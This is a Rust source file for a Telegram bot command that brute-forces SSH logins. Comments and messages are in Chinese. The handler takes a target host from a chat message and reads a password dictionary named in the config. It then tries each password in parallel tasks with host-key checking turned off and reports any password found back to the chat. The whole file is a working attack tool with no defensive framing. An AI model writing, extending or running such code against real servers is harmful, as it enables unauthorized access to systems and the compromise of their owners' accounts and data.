use std::{
    sync::{
        atomic::{AtomicBool, AtomicUsize, Ordering},
        Arc,
    },
    time::Duration,
};

use crate::GLOBAL_CONFIG;
use async_channel;
use async_ssh2_tokio::client::{AuthMethod, Client, ServerCheckMethod};
use ferrisgram::error::Result;
use ferrisgram::{error::GroupIteration, ext::Context, Bot};
use tokio::{
    fs::File,
    io::{AsyncBufReadExt, BufReader},
    sync::Mutex,
    task::JoinHandle,
    time::Instant,
};

pub async fn ssh_brute(bot: Bot, ctx: Context) -> Result<GroupIteration> {
    // Same logic as chat applies on unwrapping effective message here.
    let msg = ctx.effective_message.unwrap();
    let chat_id = msg.chat.id;
    let cm = msg.text.unwrap();

    let message_first_text = bot
        .send_message(
            chat_id,
            "正在准备进行爆破，每5秒更新一次状态(减少TG_API调用速率)".to_string(),
        )
        .parse_mode("markdown".to_string())
        .send()
        .await
        .unwrap();

    let host = Arc::new(cm[11..].trim().to_owned());

    // 获取用户名，默认为 root
    let username = GLOBAL_CONFIG
        .brute_force
        .ssh
        .get("username")
        .map(|un| un.as_str())
        .unwrap();
    // 获取ssh端口，默认为 22
    let port: u16 = GLOBAL_CONFIG
        .brute_force
        .ssh
        .get("port")
        .and_then(|port_str| port_str.parse().ok())
        .unwrap_or(22);
    // 获取字典，默认为 ./ssh_password.txt
    let brute_file = GLOBAL_CONFIG
        .brute_force
        .ssh
        .get("brute_file")
        .map(|s| s.as_str())
        .unwrap();

    // 发送密码字典文件的每一行进行处理
    let (tx, rx) = async_channel::unbounded();
    let send_password_joinhandle = tokio::spawn(async move {
        let file = File::open(brute_file).await.unwrap();
        let mut lines = BufReader::new(file).lines();
        while let Some(line) = lines.next_line().await.unwrap() {
            let _ = tx.send(line).await;
        }
        drop(tx);
    });

    // 并发任务数，默认为 16
    let task_count: usize = GLOBAL_CONFIG
        .brute_force
        .ssh
        .get("threads")
        .unwrap()
        .parse()
        .unwrap();
    // 将TASK_COUNT个任务放进JoinSet中
    // let mut set = JoinSet::new();
    // 记录尝试次数
    let brute_count = Arc::new(AtomicUsize::new(0));
    let find_passwd = Arc::new(AtomicBool::new(false));
    let password = Arc::new(Mutex::new(String::new()));
    // 每个接收密码的处理任务
    let mut abort_handles = Vec::with_capacity(task_count);

    // 构建任务读取文件内容并爆破
    for _ in 0..task_count {
        // 接收文件内容的通道Receive
        let rx_clone = rx.clone();
        // 记录尝试次数
        let brute_count_clone = Arc::clone(&brute_count);
        let host_clone = Arc::clone(&host);
        let find_passwd_clone = Arc::clone(&find_passwd);
        let password_clone = Arc::clone(&password);
        let joinhandle = tokio::task::spawn(async move {
            while let Ok(pw_line) = rx_clone.recv().await {
                let auth_method: AuthMethod = AuthMethod::with_password(pw_line.as_str());

                if Client::connect(
                    (host_clone.as_ref().clone(), port),
                    username,
                    auth_method,
                    ServerCheckMethod::NoCheck,
                )
                .await
                .is_ok()
                {
                    // println!("已成功登录 密码为：{:?}", pw_line);
                    // let _ = tx_finder_clone.send(pw_line).await;
                    find_passwd_clone.store(true, Ordering::Relaxed);
                    password_clone.lock().await.push_str(&pw_line);
                    // sleep(Duration::from_millis(2)).await;
                    return;
                } else {
                    brute_count_clone.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        // 每个任务进行循环尝试密码登录，成功则向正确密码通道发送密码，无论是否找到发送消息告知任务完毕
        abort_handles.push(joinhandle);
    }
    drop(rx);
    let start_time = Instant::now(); // 开始运行的时间
    let mut timing = Instant::now(); // 计时器，发送消息的间隔时间
    let send_time = Duration::from_secs(
        GLOBAL_CONFIG
            .brute_force
            .ssh
            .get("display_message_time_interval_seconds")
            .unwrap()
            .parse::<u64>()
            .unwrap(),
    ); //每隔多少秒向用户发送消息，以证明程序正在运行

    loop {
        if find_passwd.load(Ordering::Relaxed) {
            // let password = &finds[0];
            let message = format!(
                "+已找到密码: *{}* 耗时:{}秒 已尝试：{}次",
                password.lock().await.clone(),
                start_time.elapsed().as_secs(),
                brute_count.load(Ordering::Relaxed)
            );
            _ = bot
                .send_message(chat_id, message)
                .parse_mode("markdown".to_string())
                .send()
                .await;
            break;
        }
        if timing.elapsed() >= send_time {
            timing = Instant::now();
            let message = format!(
                "=_正在尝试中_。。。每5秒发送一次状态，已运行：{}秒 已尝试：{}次",
                start_time.elapsed().as_secs(),
                brute_count.load(Ordering::Relaxed)
            );
            _ = bot
                .edit_message_text(message)
                .chat_id(chat_id)
                .message_id(message_first_text.message_id)
                .parse_mode("markdown".to_string())
                .send()
                .await;
        }
        if abort_handles
            .iter()
            .all(|jh: &JoinHandle<()>| jh.is_finished())
            && !find_passwd.load(Ordering::Relaxed)
        {
            let message = format!(
                "-密码未找到，耗时：{}秒 已尝试：{}次",
                start_time.elapsed().as_secs(),
                brute_count.load(Ordering::Relaxed)
            );
            _ = bot
                .send_message(chat_id, message)
                .parse_mode("markdown".to_string())
                .send()
                .await;
            break;
        }
    }

    // 清理工作
    for i in abort_handles {
        i.abort();
    }
    // 终止发送密码的任务
    send_password_joinhandle.abort();
    // drop(rx);
    drop(brute_count);

    Ok(GroupIteration::EndGroups)
}
